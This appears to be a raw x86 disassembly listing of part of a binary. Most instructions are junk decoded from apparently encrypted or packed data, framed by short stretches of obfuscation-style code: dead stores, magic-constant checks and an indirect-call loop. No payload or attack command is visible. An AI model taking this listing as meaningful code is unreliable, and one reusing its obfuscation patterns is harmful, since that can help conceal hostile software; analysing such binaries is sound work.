  402078:	dec    esi
  402079:	add    BYTE PTR [eax],al
  40207b:	mov    DWORD PTR ds:0x42ef24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e85a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e862,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi+0x71852b97],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x4020da
  4020cf:	mov    ah,0x4f
  4020d1:	mov    al,ds:0x72a49bb0
  4020d6:	aaa    
  4020d7:	mov    ds:0xe0266f2e,eax
  4020dc:	inc    esp
  4020dd:	add    bl,al
  4020df:	js     0x4020a6
  4020e1:	sub    BYTE PTR fs:[ebx+0x414029dd],ah
  4020e8:	adc    ah,BYTE PTR [ecx+0x75]
  4020eb:	not    DWORD PTR [ebx+0x41993079]
  4020f1:	and    bh,BYTE PTR [ecx]
  4020f3:	mov    es,WORD PTR [edi]
  4020f5:	loopne 0x40212a
  4020f7:	dec    esp
  4020f8:	cli    
  4020f9:	call   0xf7d0f552
  4020fe:	mov    ch,BYTE PTR [edx+0x72]
  402101:	aad    0xbb
  402103:	add    al,0xe3
  402105:	push   ebp
  402106:	xor    DWORD PTR [ecx+0x7e],edi
  402109:	(bad)  
  40210b:	and    eax,0x477d1ea7
  402110:	repz xor BYTE PTR [ebp-0x79],ch
  402114:	jo     0x4020c2
  402116:	xor    al,0xf7
  402118:	push   ebx
  402119:	or     eax,0x991fff4c
  40211e:	xchg   bl,dl
  402120:	dec    ebx
  402121:	fstp   TBYTE PTR [esp+edi*8+0x5d]
  402125:	jmp    0x2918:0x14f7ec9a
  40212c:	cmp    DWORD PTR [esi+eiz*4],ecx
  40212f:	cli    
  402130:	inc    esi
  402131:	cmp    esp,DWORD PTR [ebp-0x1c]
  402134:	outs   dx,DWORD PTR es:[esi]
  402136:	cmp    al,0x67
  402138:	test   DWORD PTR [esi+ebp*1-0x1e563bfc],ecx
  40213f:	push   edi
  402140:	mov    ds:0x590dafd1,al
  402145:	xchg   DWORD PTR [ebx-0x38c10afd],ecx
  40214b:	add    ah,BYTE PTR [esi]
  40214d:	mov    ds:0xfd69f602,eax
  402152:	retf   0x80e7
  402155:	div    DWORD PTR [ecx]
  402157:	ins    DWORD PTR es:[edi],dx
  402158:	or     edx,DWORD PTR [edx+0x63d4720a]
  40215e:	fiadd  DWORD PTR [ebx-0x1f]
  402161:	mov    ebp,0xda1c24be
  402166:	sbb    BYTE PTR gs:[ebx-0x68],ah
  40216a:	inc    esp
  40216b:	inc    edx
  40216c:	outs   dx,DWORD PTR ds:[esi]
  40216d:	xchg   esp,eax
  40216e:	or     BYTE PTR [esi-0x33f64253],bl
  402174:	cmp    DWORD PTR [esi+eax*8],edx
  402177:	popf   
  402178:	xchg   esp,eax
  402179:	sbb    cl,BYTE PTR [edi+0x62c71667]
  40217f:	cmp    eax,0x5a61b338
  402184:	dec    ebx
  402185:	adc    ah,BYTE PTR [edi-0x19]
  402188:	or     eax,0x12c943dc
  40218d:	sub    bl,BYTE PTR [ecx-0x2b]
  402190:	jl     0x4021f1
  402192:	in     al,0xf
  402194:	loop   0x4021e9
  402196:	adc    ch,dl
  402198:	xor    ah,BYTE PTR [esi-0x34]
  40219b:	(bad)  
  40219c:	and    BYTE PTR [ebp-0x2cfbc013],bl
  4021a2:	stos   BYTE PTR es:[edi],al
  4021a3:	ja     0x4021a0
  4021a5:	ins    BYTE PTR es:[edi],dx
  4021a6:	aaa    
  4021a7:	fldcw  WORD PTR ds:0xe2b158d6
  4021ad:	cmp    al,0x9a
  4021af:	xor    dl,BYTE PTR [ebp+0x68]
  4021b2:	(bad)  
  4021b3:	call   FWORD PTR [ebx-0x693edc58]
  4021b9:	in     eax,dx
  4021ba:	mov    ebp,0xad511e62
  4021bf:	mov    DWORD PTR [edx],0xb6e7c5d8
  4021c5:	and    al,0xe7
  4021c7:	repz pop esp
  4021c9:	fs mov dl,0x61
  4021cc:	popa   
  4021cd:	icebp  
  4021ce:	jae    0x402222
  4021d0:	aad    0x16
  4021d2:	mov    BYTE PTR [esi+0x3d],dh
  4021d5:	aas    
  4021d6:	inc    esp
  4021d7:	sub    bh,BYTE PTR [ecx]
  4021d9:	daa    
  4021da:	mov    bh,0x7e
  4021dc:	push   ecx
  4021dd:	aad    0xd9
  4021df:	push   eax
  4021e0:	outs   dx,BYTE PTR ds:[esi]
  4021e1:	pop    ebp
  4021e2:	in     eax,dx
  4021e3:	(bad)  
  4021e4:	or     al,0x1e
  4021e6:	enter  0x90a6,0x90
  4021ea:	jmp    0xd07e467f
  4021ef:	sbb    BYTE PTR [bp-0x4a],al
  4021f3:	aas    
  4021f4:	xor    edx,DWORD PTR [edx]
  4021f6:	jmp    0x402185
  4021f8:	pop    edx
  4021f9:	mov    edx,0xfe83df34
  4021fe:	push   ds
  4021ff:	js     0x4021f5
  402201:	in     eax,0x43
  402203:	pop    ds
  402204:	in     eax,dx
  402205:	push   ds
  402206:	call   0x3283:0x76822a52
  40220d:	(bad)  
  40220e:	mov    ebp,0xbfef6adf
  402213:	jmp    0x7b0b5f58
  402218:	sub    DWORD PTR [ebp+0x229c335f],ebx
  40221e:	loope  0x4021c6
  402220:	leave  
  402221:	inc    edx
  402222:	ret    
  402223:	or     edx,ebx
  402225:	daa    
  402226:	add    BYTE PTR [ecx],bl
  402228:	inc    esi
  402229:	outs   dx,BYTE PTR ds:[esi]
  40222a:	xchg   ebx,eax
  40222b:	jnp    0x4021cb
  40222d:	or     ch,BYTE PTR [edi-0x6bb5894b]
  402233:	lods   eax,DWORD PTR ds:[esi]
  402234:	jne    0x40227b
  402236:	xchg   ebp,eax
  402237:	push   0xffffffa3
  402239:	jnp    0x40226f
  40223b:	inc    esp
  40223c:	xchg   BYTE PTR [edi+0x29],bh
  40223f:	(bad)  
  402241:	cmp    al,BYTE PTR [edx+0x1e8284bb]
  402247:	call   0xfccc:0x50b5dd5d
  40224e:	dec    esp
  40224f:	xor    DWORD PTR [ecx+0x3e],eax
  402252:	popa   
  402253:	mov    eax,ds:0x54238582
  402258:	jne    0x4022b5
  40225a:	mov    esi,0x9e4cff10
  40225f:	jmp    0x40228d
  402261:	jb     0x40222b
  402263:	sbb    ebp,DWORD PTR [eax-0x223c3239]
  402269:	add    al,0x3d
  40226b:	iret   
  40226c:	out    0xbc,al
  40226e:	imul   DWORD PTR [edx]
  402270:	or     esi,DWORD PTR [eax-0x17]
  402273:	icebp  
  402274:	add    BYTE PTR [eax+esi*4],bh
  402277:	test   esi,edx
  402279:	sub    cl,BYTE PTR [esi]
  40227b:	cmp    cl,BYTE PTR [edi+eax*4]
  40227e:	scas   al,BYTE PTR es:[edi]
  40227f:	lods   eax,DWORD PTR ds:[esi]
  402280:	xchg   DWORD PTR ds:0x560de1e2,esp
  402286:	pop    ecx
  402287:	hlt    
  402288:	sub    BYTE PTR [ebx-0x6d],cl
  40228b:	pop    eax
  40228c:	fistp  DWORD PTR [ecx+0x1d69c077]
  402292:	sti    
  402293:	mov    ?,WORD PTR [ebp+0x3]
  402296:	sub    al,0xfd
  402298:	xor    al,0x58
  40229a:	mov    ebp,0x479f15e0
  40229f:	jae    0x402285
  4022a1:	call   0xd1a2:0x93c93d66
  4022a8:	out    0xd2,eax
  4022aa:	jo     0x40225f
  4022ac:	fwait
  4022ad:	or     DWORD PTR [edx],ecx
  4022af:	fs ret 0x8053
  4022b3:	lods   al,BYTE PTR ds:[esi]
  4022b4:	out    0x5c,eax
  4022b6:	aad    0xe6
  4022b8:	mov    eax,0xb4910ca7
  4022bd:	ja     0x40233c
  4022bf:	sub    edx,DWORD PTR [edx]
  4022c1:	sub    cl,ah
  4022c3:	mov    BYTE PTR [edx+ebx*4-0x5b],ch
  4022c7:	fnsave [ebp+0x57]
  4022ca:	mov    bl,0xe7
  4022cc:	sbb    esp,esi
  4022ce:	xchg   BYTE PTR [ebp+0x50eac389],al
  4022d4:	sub    BYTE PTR [ebp-0x14],cl
  4022d7:	hlt    
  4022d8:	mov    ecx,0xb1680a7a
  4022dd:	or     al,0x46
  4022df:	scas   al,BYTE PTR es:[edi]
  4022e0:	jge    0x402337
  4022e2:	adc    ch,dh
  4022e4:	cmp    ecx,DWORD PTR [ecx-0x36]
  4022e7:	fidivr DWORD PTR ds:0x49dd0a24
  4022ed:	inc    esp
  4022ee:	mov    eax,ds:0x92c86369
  4022f3:	jo     0x402285
  4022f5:	aas    
  4022f6:	jmp    0x4022c5
  4022f8:	jbe    0x402378
  4022fa:	ret    0x5378
  4022fd:	in     al,0xd3
  4022ff:	cmc    
  402300:	popa   
  402301:	mov    edi,0x1ad7c303
  402306:	lods   eax,DWORD PTR ds:[esi]
  402307:	gs jno 0x4022e6
  40230a:	ins    DWORD PTR es:[edi],dx
  40230b:	push   esp
  40230c:	ror    edx,0x18
  40230f:	fnsave [edx-0x66c9c09c]
  402315:	sar    BYTE PTR [ecx+0x33],1
  402318:	fild   DWORD PTR [ecx+0x6b]
  40231b:	cmc    
  40231c:	mov    esp,0x81f60185
  402321:	pop    esi
  402322:	mov    ebp,0x93a7db92
  402327:	mov    bl,0x81
  402329:	mov    esi,0xebcc1e1
  40232e:	inc    esi
  40232f:	inc    ebp
  402330:	cmp    al,0xb7
  402332:	add    eax,DWORD PTR [edi]
  402334:	push   esi
  402335:	cli    
  402336:	jmp    0x4022df
  402338:	mov    bh,0x94
  40233a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40233b:	inc    esp
  40233c:	imul   BYTE PTR [edx+0x219e38fa]
  402342:	push   0x16f2db8d
  402347:	repz repz adc esi,ebx
  40234b:	aas    
  40234c:	dec    edi
  40234d:	sahf   
  40234e:	out    dx,al
  40234f:	sar    DWORD PTR [esi],1
  402351:	or     BYTE PTR [esi-0x73],dl
  402354:	mov    bl,0x8b
  402356:	sbb    al,BYTE PTR [edi+0x3c86d592]
  40235c:	sahf   
  40235d:	mov    bl,0x26
  40235f:	push   ecx
  402360:	cmp    edi,DWORD PTR [ecx+0xc]
  402363:	mov    eax,0xb8f6b8fa
  402368:	lea    esi,[eax+eax*2+0x2ef200c9]
  40236f:	out    dx,eax
  402370:	sub    DWORD PTR [esi+0x45],0xbb1b3f4e
  402377:	(bad)
  40237a:	adc    DWORD PTR [edi+0x40],edx
  40237d:	and    ebx,DWORD PTR [edx+0x62820061]
  402383:	dec    edx
  402384:	mov    bh,dl
  402386:	cmp    eax,0x7e1d11b4
  40238b:	mov    ch,0x5d
  40238d:	xchg   BYTE PTR [ebp-0x6ad11a1a],ah
  402393:	fcom   st(5)
  402395:	sti    
  402396:	out    dx,al
  402397:	stc    
  402398:	add    dl,bh
  40239a:	or     bl,BYTE PTR [ecx+0x35]
  40239d:	add    ebp,DWORD PTR [ecx-0x3de417a5]
  4023a3:	push   es
  4023a4:	mov    ecx,0xd9f99dba
  4023a9:	cmp    esi,DWORD PTR [esi+0x2a68b056]
  4023af:	or     ebp,DWORD PTR [ecx-0x7]
  4023b2:	dec    esi
  4023b3:	cmp    ah,dh
  4023b5:	cmp    ecx,DWORD PTR [ebx+0x162a33c]
  4023bb:	jle    0x4023e0
  4023bd:	test   DWORD PTR fs:[edi],edx
  4023c0:	inc    ebp
  4023c1:	out    dx,al
  4023c2:	mov    edi,ss
  4023c4:	idiv   BYTE PTR [ebx+0x50]
  4023c7:	jmp    0x40236c
  4023c9:	push   ss
  4023ca:	or     edx,DWORD PTR [ebx]
  4023cc:	(bad)  
  4023cd:	mov    ebx,0x20ff84ec
  4023d2:	ss scas eax,DWORD PTR es:[edi]
  4023d4:	or     ebx,DWORD PTR [ecx+eax*2+0x6239412a]
  4023db:	jbe    0x402381
  4023dd:	mov    esi,0x7552f6b6
  4023e2:	mov    esp,0x1bb2cbf6
  4023e7:	push   eax
  4023e8:	push   cs
  4023e9:	fstp   DWORD PTR [ecx]
  4023eb:	call   0xf52d:0xe484b5e6
  4023f2:	push   ebx
  4023f3:	outs   dx,BYTE PTR ds:[esi]
  4023f4:	push   ecx
  4023f5:	mov    cl,0x87
  4023f7:	xor    edx,esi
  4023f9:	in     al,dx
  4023fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023fb:	aas    
  4023fc:	xchg   edi,eax
  4023fd:	dec    eax
  4023fe:	pop    esi
  4023ff:	(bad)  
  402400:	repz std 
  402402:	fiadd  WORD PTR [ecx]
  402404:	fld    DWORD PTR [eax+0x45]
  402407:	push   cs
  402408:	rcl    BYTE PTR [esi-0x70],cl
  40240b:	imul   esp,DWORD PTR [ebx],0xffffffe9
  40240e:	sbb    dl,BYTE PTR [ebp+0x54bdb6d5]
  402414:	mov    al,0x3d
  402416:	aaa    
  402417:	push   ebx
  402418:	pop    eax
  402419:	imul   esi
  40241b:	(bad)  
  40241c:	es push ebp
  40241e:	popa   
  40241f:	push   edi
  402420:	push   esi
  402421:	call   0x95d3:0x8ae2d9fb
  402428:	mov    dl,0xab
  40242a:	out    0xb4,al
  40242c:	repz xor DWORD PTR [esi+0x1e],edx
  402430:	pusha  
  402431:	push   es
  402432:	je     0x4023db
  402434:	mov    al,ds:0x5a9e3e8c
  402439:	jbe    0x402407
  40243b:	push   es
  40243c:	shl    esp,1
  40243e:	sahf   
  40243f:	shl    DWORD PTR [esi],1
  402441:	gs daa 
  402443:	fcmovnbe st,st(6)
  402445:	mov    BYTE PTR [edx],dh
  402447:	xchg   esi,eax
  402448:	retf   
  402449:	(bad)  
  40244a:	sar    ch,cl
  40244c:	loope  0x40248c
  40244e:	popf   
  40244f:	push   0xf03a477a
  402454:	pop    ds
  402455:	or     al,0x74
  402457:	push   ds
  402458:	lahf   
  402459:	pop    edx
  40245a:	adc    eax,0x3fd2c0dc
  40245f:	out    dx,al
  402460:	xchg   ecx,eax
  402461:	dec    esp
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x430646,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4305be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4305ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	(bad)  
  4024b5:	clc    
  4024b6:	push   edx
  4024b7:	movd   DWORD PTR [esi-0x7e],mm7
  4024bb:	jno    0x40253b
  4024bd:	jle    0x402458
  4024bf:	shl    dl,0xa8
  4024c2:	and    bh,ah
  4024c4:	mov    ds:0x553532b2,eax
  4024c9:	dec    ebp
  4024ca:	in     eax,dx
  4024cb:	and    BYTE PTR [edx],dh
  4024cd:	std    
  4024ce:	test   BYTE PTR [esi+0x9e65842],0xdd
  4024d5:	push   ds
  4024d6:	jmp    0xd98ebe07
  4024db:	jecxz  0x40247e
  4024dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024de:	jg     0x40253b
  4024e0:	mov    edx,0x912190f3
  4024e5:	cld    
  4024e6:	das    
  4024e7:	xchg   DWORD PTR [eax-0x3f],edx
  4024ea:	and    BYTE PTR [edx+0x9],0x9
  4024ee:	adc    bh,bl
  4024f0:	add    DWORD PTR [esi-0x23],ebx
  4024f3:	int3   
  4024f4:	cmc    
  4024f5:	cmp    esi,DWORD PTR [ecx+ebx*2]
  4024f8:	sub    eax,0xf17ba07
  4024fd:	pop    ss
  4024fe:	pop    ss
  4024ff:	jo     0x4024ee
  402501:	in     eax,0x92
  402503:	jmp    0xbc529382
  402508:	(bad)  
  402509:	inc    ebx
  40250a:	stos   DWORD PTR es:[edi],eax
  40250b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40250c:	xor    BYTE PTR [ebx+0x3a3257cc],bl
  402512:	std    
  402513:	adc    esi,DWORD PTR [ebp+eiz*8-0x12b2ad7b]
  40251a:	mov    DWORD PTR [ecx],0x474e7cd3
  402520:	push   0x36
  402522:	fimul  DWORD PTR [edx]
  402524:	push   es
  402525:	pcmpeqw xmm6,XMMWORD PTR [edi-0x33121777]
  40252d:	rcr    DWORD PTR [edx],1
  40252f:	mov    ds:0xffc30138,eax
  402534:	jmp    0x622df4ce
  402539:	mov    al,0x67
  40253b:	add    al,0x1e
  40253d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40253e:	mov    ds:0xacd69069,eax
  402543:	in     al,0x1c
  402545:	test   DWORD PTR [esi-0x7bcef07a],edi
  40254b:	xchg   DWORD PTR [eax+eax*1+0x17],edx
  40254f:	sahf   
  402550:	adc    DWORD PTR [ebx+0x5e5867f2],edi
  402556:	sub    esi,DWORD PTR [esi+0x71da6064]
  40255c:	mov    al,0xb5
  40255e:	fdiv   DWORD PTR [ecx+0x5a]
  402561:	dec    ebp
  402562:	rol    BYTE PTR [edx+ebx*8+0x8a3d68c],1
  402569:	mov    esp,0xa1a3b19
  40256e:	daa    
  40256f:	sub    dl,BYTE PTR fs:0x9436478f
  402576:	xchg   edx,ebx
  402578:	fistp  DWORD PTR [esi+eiz*2-0x6f2e7824]
  40257f:	push   es
  402580:	daa    
  402581:	ja     0x402517
  402583:	jmp    0xa28f:0xc61d637d
  40258a:	dec    esp
  40258b:	mov    edi,0xa0627bfd
  402590:	mov    dh,0xf3
  402592:	xor    eax,0x9c464830
  402597:	push   ecx
  402598:	test   eax,0x1841d2c6
  40259d:	arpl   si,di
  40259f:	or     al,0x3a
  4025a1:	(bad)  [edi-0x6c0b5e55]
  4025a7:	mov    bh,0xe9
  4025a9:	lods   eax,DWORD PTR ds:[esi]
  4025aa:	not    DWORD PTR [esp+esi*4-0x62]
  4025ae:	dec    eax
  4025af:	cs jb  0x40256a
  4025b2:	adc    edi,esp
  4025b4:	repnz addr16 dec ebx
  4025b7:	scas   eax,DWORD PTR es:[edi]
  4025b8:	jmp    0xc343feb6
  4025bd:	cmp    eax,0x31f8b3a3
  4025c2:	cld    
  4025c3:	mov    dh,0x4b
  4025c5:	push   ds
  4025c6:	cld    
  4025c7:	(bad)  
  4025c9:	push   cs
  4025ca:	das    
  4025cb:	out    dx,eax
  4025cc:	mov    bh,0x81
  4025ce:	mov    esi,DWORD PTR [edx]
  4025d0:	dec    ecx
  4025d1:	pop    es
  4025d2:	ret    0x370f
  4025d5:	dec    edx
  4025d6:	and    ebx,ebx
  4025d8:	xor    al,0x3c
  4025da:	adc    ebx,DWORD PTR [edx-0x52]
  4025dd:	inc    esi
  4025de:	mov    dl,0x40
  4025e0:	push   0xfffffffa
  4025e2:	adc    al,0x68
  4025e4:	pop    ds
  4025e5:	clc    
  4025e6:	addr16 mov esp,0x41dedebb
  4025ec:	mov    esp,0xd6fb0bae
  4025f1:	push   esi
  4025f2:	cmp    al,0xe0
  4025f4:	jl     0x4025d8
  4025f6:	push   es
  4025f7:	mov    esp,0x5f28866d
  4025fc:	icebp  
  4025fd:	push   esi
  4025fe:	dec    ebp
  4025ff:	and    al,0xd0
  402601:	pop    esp
  402602:	pusha  
  402603:	jo     0x402618
  402605:	xchg   edi,eax
  402606:	jge    0x402637
  402608:	imul   ebx,DWORD PTR [edx-0x39d4a5f6],0x39247b24
  402612:	scas   eax,DWORD PTR es:[edi]
  402613:	xor    eax,0x34fa45d5
  402618:	dec    ebx
  402619:	in     al,dx
  40261a:	fiadd  WORD PTR [esi+0x6b]
  40261d:	mov    dh,0x19
  40261f:	rcr    DWORD PTR [ecx+0x24d4363f],1
  402625:	int3   
  402626:	inc    ecx
  402627:	push   esp
  402628:	jg     0x40264a
  40262a:	dec    ebx
  40262b:	bound  ebx,QWORD PTR [esp+eax*2]
  40262e:	test   eax,0xf455380e
  402633:	mov    al,ds:0x6a257553
  402638:	sbb    ebx,DWORD PTR [ebx-0x81c7d43]
  40263e:	or     ebp,ebx
  402640:	push   ebp
  402641:	daa    
  402642:	stc    
  402643:	cmp    DWORD PTR [edx-0x280b86b0],esp
  402649:	arpl   WORD PTR [eax+0x43c4d841],ax
  40264f:	or     BYTE PTR [ebx+0x7b6be3f7],dl
  402655:	arpl   WORD PTR [ebp+esi*4-0x74],sp
  402659:	mov    ah,0x1f
  40265b:	aam    0xae
  40265d:	ret    0x254c
  402660:	adc    eax,0x7ff0b41c
  402665:	pop    edi
  402666:	pop    ds
  402667:	xchg   edi,eax
  402668:	aad    0xff
  40266a:	(bad)  [ecx]
  40266c:	push   es
  40266d:	ja     0x40260e
  40266f:	ret    
  402670:	sbb    eax,0x7819839c
  402675:	add    esp,DWORD PTR [esi]
  402677:	pop    ds
  402678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402679:	jecxz  0x402653
  40267b:	in     al,0x98
  40267d:	call   0xd032:0xc4987e3a
  402684:	ret    
  402685:	push   ss
  402686:	mov    bl,al
  402688:	mov    eax,0x77648f20
  40268d:	push   0x571f16e7
  402692:	das    
  402693:	lock ins BYTE PTR es:[edi],dx
  402695:	dec    esp
  402696:	xor    al,0x87
  402698:	out    dx,eax
  402699:	adc    ch,BYTE PTR [ebx+0x267ab2a8]
  40269f:	test   al,dh
  4026a1:	imul   esp,DWORD PTR [ebp-0x7e],0x42eb5d7b
  4026a8:	and    BYTE PTR [eax+ebx*1+0x258bfa8e],0xce
  4026b0:	loopne 0x4026ce
  4026b2:	add    ah,BYTE PTR ds:0xf3cb010a
  4026b8:	jno    0x4026d4
  4026ba:	stos   BYTE PTR es:[edi],al
  4026bb:	fs cli 
  4026bd:	repz mov al,ds:0x99d36ee9
  4026c3:	inc    esp
  4026c4:	adc    eax,0xa49e967c
  4026c9:	jecxz  0x402656
  4026cb:	daa    
  4026cc:	push   edx
  4026cd:	xlat   BYTE PTR ds:[ebx]
  4026ce:	ss mov cl,0x2d
  4026d1:	clc    
  4026d2:	or     BYTE PTR [ebx],0x48
  4026d5:	out    0x39,eax
  4026d7:	mov    dl,0xcd
  4026d9:	jmp    0x4026ab
  4026db:	sbb    dh,BYTE PTR [edi+0x76c78433]
  4026e1:	xor    DWORD PTR [edi+0x7c9ecad7],ebp
  4026e7:	pop    edi
  4026e8:	sti    
  4026e9:	lahf   
  4026ea:	xchg   ebx,eax
  4026eb:	or     eax,0xd9845bbb
  4026f0:	xlat   BYTE PTR ds:[ebx]
  4026f1:	or     edx,ebx
  4026f3:	loopne 0x40276a
  4026f5:	or     BYTE PTR [edi-0x26],al
  4026f8:	clc    
  4026f9:	mov    eax,ds:0xead4d924
  4026fe:	in     al,0x83
  402700:	nop
  402701:	add    al,0xc8
  402703:	popa   
  402704:	sub    ch,ah
  402706:	ret    
  402707:	add    DWORD PTR [esi],eax
  402709:	retf   
  40270a:	cmc    
  40270b:	dec    edx
  40270c:	jp     0x4026e8
  40270e:	(bad)  ss:[edi]
  402711:	or     ebp,DWORD PTR [eax+0x4203a600]
  402717:	mov    ds:0x83da2dd5,al
  40271c:	or     eax,0xe73c37dc
  402721:	pop    esi
  402722:	jnp    0x40271e
  402724:	das    
  402725:	aas    
  402726:	cdq    
  402727:	adc    ebx,DWORD PTR [eax+0x31]
  40272a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40272b:	div    DWORD PTR [esi]
  40272d:	cli    
  40272e:	pop    ss
  40272f:	jo     0x40276d
  402731:	cwde   
  402732:	inc    esp
  402733:	cmp    edi,DWORD PTR [ebx+esi*2+0x1dc9d390]
  40273a:	clc    
  40273b:	push   esp
  40273c:	(bad)  
  40273d:	jle    0x4027bc
  40273f:	pop    edx
  402740:	lock jae 0x402739
  402743:	mov    bl,0x1c
  402745:	cmp    BYTE PTR [ebx],ah
  402747:	fiadd  WORD PTR [ecx-0x57af1fc9]
  40274d:	inc    BYTE PTR [edx+0x3635d83c]
  402753:	lock fld QWORD PTR ds:0xe64b7c86
  40275a:	loope  0x4027b2
  40275c:	pop    ss
  40275d:	sti    
  40275e:	mov    dh,0xda
  402760:	hlt    
  402761:	sbb    bh,BYTE PTR [eax-0x21]
  402764:	loope  0x402766
  402766:	jns    0x402740
  402768:	call   0x5eee:0xf249ccd4
  40276f:	(bad)  
  402770:	mov    ds:0x249d3310,al
  402775:	mov    bl,0x91
  402777:	ror    DWORD PTR [edi+eiz*2+0x3a128f6f],0x40
  40277f:	pop    edx
  402780:	sbb    eax,0x4e835681
  402785:	inc    ebp
  402786:	or     BYTE PTR [edx+0x5b0e0b88],ah
  40278c:	jne    0x402790
  40278e:	add    eax,0xf1d2ea70
  402793:	(bad)  
  402794:	ror    DWORD PTR [edx],cl
  402796:	(bad)  
  402797:	jge    0x402721
  402799:	mov    eax,0xc82ea59b
  40279e:	ins    BYTE PTR es:[edi],dx
  40279f:	adc    al,0xf7
  4027a1:	jno    0x40275d
  4027a3:	sub    al,0xac
  4027a5:	pop    edx
  4027a6:	shl    DWORD PTR [ebp+0x50],cl
  4027a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027aa:	pusha  
  4027ab:	pop    eax
  4027ac:	xchg   ecx,eax
  4027ad:	xchg   DWORD PTR [ebx-0x1],ebp
  4027b0:	adc    eax,0xee8fcee
  4027b5:	pop    ecx
  4027b6:	xchg   BYTE PTR [ebp-0x68],dh
  4027b9:	lods   al,BYTE PTR ds:[si]
  4027bb:	inc    esi
  4027bc:	inc    eax
  4027bd:	div    DWORD PTR [eax-0x26]
  4027c0:	hlt    
  4027c1:	mov    edx,0x788bf2e8
  4027c6:	pop    es
  4027c7:	lea    ebp,[eax-0x16]
  4027ca:	rcl    BYTE PTR [edi+0x19e8e6e2],0x79
  4027d1:	cli    
  4027d2:	push   ds
  4027d3:	faddp  st(3),st
  4027d5:	lods   eax,DWORD PTR ds:[esi]
  4027d6:	dec    edi
  4027d7:	clc    
  4027d8:	pop    ecx
  4027d9:	xor    ecx,0xdcec470c
  4027df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027e0:	pop    edx
  4027e1:	fdiv   DWORD PTR [ebx+0x1b8ce137]
  4027e7:	and    esp,DWORD PTR [esi+ecx*1+0x451d5a6]
  4027ee:	sbb    DWORD PTR [ecx+0x4cc34962],esi
  4027f4:	add    ecx,DWORD PTR [edi+0x3a829d53]
  4027fa:	adc    al,0x5d
  4027fc:	lods   ax,WORD PTR ds:[esi]
  4027fe:	mov    ah,0xf2
  402800:	inc    esi
  402801:	sbb    dh,BYTE PTR [esi]
  402803:	or     al,0xa9
  402805:	test   al,0x4c
  402807:	xchg   esp,eax
  402808:	inc    ebp
  402809:	repnz pushf 
  40280b:	mov    esi,0x56a0a3fc
  402810:	frstor [eax+0x58e9167c]
  402816:	jmp    0x4027cf
  402818:	pop    edi
  402819:	mov    DWORD PTR [ecx+0x70],ebx
  40281c:	clc    
  40281d:	jmp    0x16958e6f
  402822:	popf   
  402823:	mov    ebp,0xdc845c6f
  402828:	sar    BYTE PTR [ebx+eax*2-0x74],1
  40282c:	xor    al,0x9a
  40282e:	push   esi
  40282f:	js     0x40289c
  402831:	call   0xc4ca6ef0
  402836:	gs js  0x40282f
  402839:	andps  xmm5,XMMWORD PTR [ebx]
  40283c:	push   es
  40283d:	xor    BYTE PTR [ebx-0x68],bh
  402840:	outs   dx,BYTE PTR ds:[esi]
  402841:	scas   eax,DWORD PTR es:[edi]
  402842:	jmp    0xacdd54d9
  402847:	ret    
  402848:	gs jne 0x402834
  40284b:	mov    al,bl
  40284d:	lods   eax,DWORD PTR ds:[esi]
  40284e:	outs   dx,DWORD PTR ds:[esi]
  40284f:	lds    eax,FWORD PTR [esi+edi*8]
  402852:	or     DWORD PTR [eax],0x60751c9e
  402858:	mov    DWORD PTR ds:0x42e85e,0x14
  402862:	cmp    DWORD PTR ds:0x42e85e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e85e,0x6
  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42ead8
  402885:	cmp    DWORD PTR ds:0x42e85e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e85e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e85e,eax
  4028a0:	mov    eax,ds:0x42e85e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e85e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
